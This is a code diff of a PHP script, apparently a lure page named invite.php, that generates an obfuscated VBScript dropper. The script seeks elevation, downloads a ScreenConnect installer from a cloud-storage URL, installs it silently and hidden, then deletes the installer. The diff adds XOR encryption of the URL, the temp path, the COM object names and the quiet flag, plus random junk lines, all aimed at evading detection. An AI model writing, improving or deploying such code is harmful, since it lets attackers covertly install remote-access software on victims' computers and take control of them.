@@ -1,5 +1,5 @@
 <?php
-// invite.php - Moderate Encryption (including download URL)
+// invite.php - Stronger Encryption Version
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -33,9 +33,9 @@ $scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetu
 $sessionId = bin2hex(random_bytes(24));
 $ts = time();
 $randV1 = 'v' . substr(md5(random_bytes(8)), 0, 12);
-$xorKey = rand(100, 255);
+$xorKey = rand(110, 240);
 
-// Encrypt the URL with the same key
+// Encryption helper
 function xorEncrypt($text, $key) {
     $result = '';
     for ($i = 0; $i < strlen($text); $i++) {
@@ -44,14 +44,22 @@ function xorEncrypt($text, $key) {
     return $result;
 }
 
-$encryptedUrl = xorEncrypt($scUrl, $xorKey);
-$encryptedUrlVbs = "";
-for ($i = 0; $i < strlen($encryptedUrl); $i++) {
-    $encryptedUrlVbs .= "Chr(" . ord($encryptedUrl[$i]) . ") & ";
+function toVbsChr($text) {
+    $out = "";
+    for ($i = 0; $i < strlen($text); $i++) {
+        $out .= "Chr(" . ord($text[$i]) . ")";
+        if ($i < strlen($text) - 1) $out .= " & ";
+    }
+    return $out;
 }
-$encryptedUrlVbs = rtrim($encryptedUrlVbs, " & ");
 
-// Max ~1 KB difference
+// Encrypt important strings
+$encUrl     = toVbsChr(xorEncrypt($scUrl, $xorKey));
+$encTemp    = toVbsChr(xorEncrypt("%TEMP%\\sc_setup.msi", $xorKey));
+$encHttp    = toVbsChr(xorEncrypt("MSXML2.XMLHTTP", $xorKey));
+$encStream  = toVbsChr(xorEncrypt("ADODB.Stream", $xorKey));
+$encQuiet   = toVbsChr(xorEncrypt("/quiet", $xorKey));
+
 $junkLines = rand(5, 25);
 $junk = "";
 for ($i = 0; $i < $junkLines; $i++) {
@@ -78,7 +86,6 @@ Function D(s)
     D = r
 End Function
 
-' ===== ELEVATION =====
 If WScript.Arguments.Length = 0 Then
     Dim shell
     Set shell = CreateObject("Shell.Application")
@@ -90,28 +97,27 @@ Sub DownloadAndExecute()
     On Error Resume Next
     Dim u, p, http, strm
     
-    u = $encryptedUrlVbs
-    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
+    u = $encUrl
+    p = objShell.ExpandEnvironmentStrings(D($encTemp))
   
-    Set http = CreateObject("MSXML2.XMLHTTP")
+    Set http = CreateObject(D($encHttp))
     http.Open "GET", u, False
     http.Send
     
     If http.Status = 200 Then
-        Set strm = CreateObject("ADODB.Stream")
+        Set strm = CreateObject(D($encStream))
         strm.Type = 1
         strm.Open
         strm.Write http.responseBody
         strm.SaveToFile p, 2
         strm.Close
         
-        objShell.Run """" & p & """ /quiet", 0, True
+        objShell.Run """" & p & """ " & D($encQuiet), 0, True
         WScript.Sleep 90000
         If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
     End If
 End Sub
 
-' ===== MAIN =====
 Call DownloadAndExecute
 
 $junk
